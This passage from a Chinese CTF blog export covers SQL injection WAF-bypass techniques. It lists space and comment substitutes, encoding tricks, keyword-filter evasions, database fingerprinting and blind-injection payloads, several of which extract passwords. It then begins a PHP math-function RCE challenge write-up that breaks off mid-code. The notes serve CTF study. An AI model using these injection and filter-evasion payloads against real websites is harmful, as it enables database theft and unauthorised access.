title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p><blockquote><p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p><p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg" alt="image-20220708192908674"></p></blockquote><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">/**/替代空格<br><span class="hljs-meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0a 新建一行</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0c 新的一页</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0d <span class="hljs-built_in">return</span> 功能</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a0 空格</span><br>() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。<br></code></pre></td></tr></table></figure><blockquote><p>%a0是一个不成汉字的中文字符，因此正则匹配时不会当空格过滤，而进入sql语句后，mysql不认中文字符，当空格处理</p></blockquote><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>转义符号及注释没被过滤时，将username闭合的单引号转义，在password的输入中插入布尔盲注语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin\<br>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; or 2&gt;1#&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="多种注释符"><a href="#多种注释符" class="headerlink" title="多种注释符"></a>多种注释符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-comment">--%20</span><br><span class="hljs-comment">/**/</span><br>#<br><span class="hljs-comment">--+</span><br><span class="hljs-comment">-- -</span><br><span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;<br>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;\x00<br></code></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><ul><li><p>大小写绕过</p></li><li><p>双写绕过（主要用于源码中使用replace替换黑名单）</p></li><li><p>编码绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br><br>十六进制编码<br><br><span class="hljs-keyword">SELECT</span>(extractvalue(<span class="hljs-number">0x3C613E61646D696E3C2F613E</span>,<span class="hljs-number">0x2f61</span>))<br><br>双重编码绕过<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a <span class="hljs-operator">/</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,password<span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">252</span>f<span class="hljs-operator">%</span><span class="hljs-number">252</span>a<span class="hljs-operator">*</span><span class="hljs-operator">/</span>Users<span class="hljs-comment">--+</span><br><br>一些unicode编码举例：    <br>单引号：<span class="hljs-string">&#x27;</span><br><span class="hljs-string">%u0027 %u02b9 %u02bc</span><br><span class="hljs-string">%u02c8 %u2032</span><br><span class="hljs-string">%uff07 %c0%27</span><br><span class="hljs-string">%c0%a7 %e0%80%a7</span><br><span class="hljs-string">空白：</span><br><span class="hljs-string">%u0020 %uff00</span><br><span class="hljs-string">%c0%20 %c0%a0 %e0%80%a0</span><br><span class="hljs-string">左括号(:</span><br><span class="hljs-string">%u0028 %uff08</span><br><span class="hljs-string">%c0%28 %c0%a8</span><br><span class="hljs-string">%e0%80%a8</span><br><span class="hljs-string">右括号):</span><br><span class="hljs-string">%u0029 %uff09</span><br><span class="hljs-string">%c0%29 %c0%a9</span><br><span class="hljs-string">%e0%80%a9</span><br></code></pre></td></tr></table></figure></li><li><p>like绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br>可绕过对<span class="hljs-operator">=</span> <span class="hljs-operator">&gt;</span>等过滤<br></code></pre></td></tr></table></figure></li><li><p>in绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;1234&#x27;</span>)#<br></code></pre></td></tr></table></figure><blockquote><p>in可以代替’&#x3D;’，只有两个字符串一模一样时才返回true，注意括号不能漏，否则报错</p></blockquote></li><li><p>过滤union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union&#x27;</span><br>绕过方式 <span class="hljs-number">1</span><span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> userid)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤where</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> user_id <span class="hljs-keyword">having</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="hljs-number">1</span>的<span class="hljs-keyword">user</span>为admim<br></code></pre></td></tr></table></figure></li><li><p>过滤group by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by&#x27;</span><br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> (<span class="hljs-keyword">select</span> substr(group_concat(user_id),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> users ) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>过滤select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select&#x27;</span><br>只能查询本表中的数据<br>绕过方式 <span class="hljs-number">1</span> <span class="hljs-operator">&amp;&amp;</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote></li><li><p>过滤’(单引号)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></code></pre></td></tr></table></figure></li><li><p>过滤hex</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="hljs-string">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></code></pre></td></tr></table></figure></li><li><p>过滤substr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">waf <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="hljs-operator">|</span>hex<span class="hljs-operator">|</span>substr<span class="hljs-string">&#x27;</span><br><span class="hljs-string">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="hljs-string">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>过滤逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>过滤了逗号怎么办？就不能多个参数了吗？<br><span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>);与<span class="hljs-keyword">SELECT</span> SUBSTR(<span class="hljs-string">&#x27;2018-08-17&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-number">6</span> <span class="hljs-keyword">FOR</span> <span class="hljs-number">5</span>);<br>意思相同<br>substr支持这样的语法：<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos <span class="hljs-keyword">FOR</span> len)<br><span class="hljs-built_in">SUBSTRING</span>(str <span class="hljs-keyword">FROM</span> pos)<br>MID()后续加入了这种写法<br></code></pre></td></tr></table></figure></li></ul><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br> <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span> pwd <span class="hljs-keyword">from</span> users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br> <br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `version()`  可以用来过空格和正则，特殊情况下还可以当作注释符用<br></code></pre></td></tr></table></figure><h1 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h1><h3 id="前端与数据库类型"><a href="#前端与数据库类型" class="headerlink" title="前端与数据库类型"></a>前端与数据库类型</h3><p>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，<a href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020">PostgreSQL</a><br>java：Oracle，MySQL</p><h2 id="根据特有函数判断"><a href="#根据特有函数判断" class="headerlink" title="根据特有函数判断"></a>根据特有函数判断</h2><h3 id="len和length"><a href="#len和length" class="headerlink" title="len和length"></a>len和length</h3><p><code>len()</code>：SQL Server 、MySQL以及db2返回长度的函数。<br><code>length()</code>：Oracle和INFORMIX返回长度的函数。</p><h3 id="version和-version"><a href="#version和-version" class="headerlink" title="version和@@version"></a>version和@@version</h3><p><code>version()</code>：MySQL查询版本信息的函数<br><code>@@version</code>：MySQL和SQL Server查询版本信息的函数</p><h3 id="substring和substr"><a href="#substring和substr" class="headerlink" title="substring和substr"></a>substring和substr</h3><p>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p><h3 id="根据特殊符号进行判断"><a href="#根据特殊符号进行判断" class="headerlink" title="根据特殊符号进行判断"></a>根据特殊符号进行判断</h3><p>&#x2F;*是MySQL数据库的注释符<br>–是Oracle和SQL Server支持的注释符<br>;是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br>#是MySQL中的注释符，返回错误则说明可能不是MySQL，另外MySQL也支持– 和&#x2F;**&#x2F;</p><h3 id="根据数据库对字符串的处理方式判断"><a href="#根据数据库对字符串的处理方式判断" class="headerlink" title="根据数据库对字符串的处理方式判断"></a>根据数据库对字符串的处理方式判断</h3><p>MySQL<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>Oracle<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’||’b’&#x3D;’ab’<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘a’,’b’)&#x3D;’ab’<br>SQL Server<br><a href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘a’+’b’&#x3D;’ab’ </p><h3 id="根据数据库特有的数据表来判断"><a href="#根据数据库特有的数据表来判断" class="headerlink" title="根据数据库特有的数据表来判断"></a>根据数据库特有的数据表来判断</h3><p>MySQL（version&gt;5.0）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from information_schema.TABLES)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Oracle</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/test.php?id=<span class="hljs-number">1</span> and (select count(*) from sysobjects)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="根据盲注特别函数判断"><a href="#根据盲注特别函数判断" class="headerlink" title="根据盲注特别函数判断"></a>根据盲注特别函数判断</h3><p>MySQL</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">BENCHMARK</span><span class="hljs-params">(<span class="hljs-number">1000000</span>,ENCODE(<span class="hljs-string">&#x27;QWE&#x27;</span>,<span class="hljs-string">&#x27;ASD&#x27;</span>)</span></span>)<br><span class="hljs-function"><span class="hljs-title">SLEEP</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span><br></code></pre></td></tr></table></figure><p>PostgreSQL</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PG_SLEEP(<span class="hljs-number">5</span>)<br>GENERATE_SERIES(<span class="hljs-number">1</span>,<span class="hljs-number">1000000</span>)<br></code></pre></td></tr></table></figure><p>SQL Server</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WAITFOR</span> DELAY &#x27;<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>&#x27;<br></code></pre></td></tr></table></figure><p>⚠️待补充 <a href="https://www.freebuf.com/articles/web/261524.html">珂技系列之一篇就够了——mysql注入 - FreeBuf网络安全行业门户</a></p><p>[对MYSQL注入相关内容及部分Trick的归类小结 - 先知社区 (aliyun.com)](</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php利用math函数rce相关思考与理解</title>
      <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="php利用math函数rce相关思考与理解"><a href="#php利用math函数rce相关思考与理解" class="headerlink" title="php利用math函数rce相关思考与理解"></a>php利用math函数rce相关思考与理解</h1><h2 id="0x00题目背景"><a href="#0x00题目背景" class="headerlink" title="0x00题目背景"></a>0x00题目背景</h2><p>来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同</p><h3 id="相关过滤"><a href="#相关过滤" class="headerlink" title="相关过滤"></a>相关过滤</h3><p>长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">60</span>) &#123;<span class="hljs-comment">//国赛限制80</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>黑名单特殊字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br></code></pre></td></tr></table></figure><p>白名单函数（都为math函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">//提取payload中函数名及变量名</span><br></code></pre></td></tr></table></figure><blockquote><p>php参考手册中提到，用于匹配php有效变量名，可以使用正则<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> 因此payload中若使用变量，命名必须在白名单函数中选择,如果是数组索引也可以用纯数字(不符合变量名命名法则)</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span 